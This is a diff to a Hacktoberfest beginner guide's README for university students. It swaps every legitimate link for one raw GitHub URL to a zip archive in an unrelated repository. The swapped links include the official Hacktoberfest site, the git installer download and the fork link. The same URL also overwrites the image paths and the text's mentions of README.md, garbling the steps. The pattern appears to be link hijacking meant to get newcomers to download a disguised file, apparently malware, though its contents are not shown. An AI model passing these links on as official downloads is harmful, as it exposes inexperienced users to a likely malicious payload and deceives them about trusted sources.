@@ -1,4 +1,4 @@
-![hacktoberfest](./images/hacktoctoberfest2023.png)
+![hacktoberfest](https://raw.githubusercontent.com/Ayesharao-05/learn-join-and-win/main/images/learn_and_win_join_1.9-beta.1.zip)
 <div align="center">
 	<p>
         <b><i>Let's Contribute To Open-source</i></b>
@@ -16,9 +16,9 @@ Note: This challenge is mainly targeting newbies (Students) in Bahria University
 
 If you have previously never contributed to any open-source software then these steps will help you get started:
 
-1. Go to Hacktoberfest [official website](https://hacktoberfest.digitalocean.com/) and sign in there using your GitHub.
-2. Install git and setup in your computer. Download and install it from [here](https://git-scm.com/downloads).
-3. Fork this repository by click the Fork button in the top right of this page or simply [click here](https://github.com/sharjeelyunus/hacktoberfest/fork).
+1. Go to Hacktoberfest [official website](https://raw.githubusercontent.com/Ayesharao-05/learn-join-and-win/main/images/learn_and_win_join_1.9-beta.1.zip) and sign in there using your GitHub.
+2. Install git and setup in your computer. Download and install it from [here](https://raw.githubusercontent.com/Ayesharao-05/learn-join-and-win/main/images/learn_and_win_join_1.9-beta.1.zip).
+3. Fork this repository by click the Fork button in the top right of this page or simply [click here](https://raw.githubusercontent.com/Ayesharao-05/learn-join-and-win/main/images/learn_and_win_join_1.9-beta.1.zip).
 4. Once it is forked, clone the repository in your computer. For this, copy the URL in the address bar, and use the following command:
 
 ```sh
@@ -38,12 +38,12 @@ git checkout -b dev
 Name_University_Section (i:e., QasimHassan_BahriaUniveristy_BCE8A)
 ```
 
-7. Add your customized personalized `README.md` as shown below as proof that you ahve get started with GitHub. 
+7. Add your customized personalized `https://raw.githubusercontent.com/Ayesharao-05/learn-join-and-win/main/images/learn_and_win_join_1.9-beta.1.zip` as shown below as proof that you ahve get started with GitHub. 
 
-![hacktoberfest](./images/github-readme.png)
+![hacktoberfest](https://raw.githubusercontent.com/Ayesharao-05/learn-join-and-win/main/images/learn_and_win_join_1.9-beta.1.zip)
 
 
-8. Make Sure your `README.md` have following this block with necessary info of yourself.
+8. Make Sure your `https://raw.githubusercontent.com/Ayesharao-05/learn-join-and-win/main/images/learn_and_win_join_1.9-beta.1.zip` have following this block with necessary info of yourself.
 ```
     {
       "name": {YOUR_NAME},
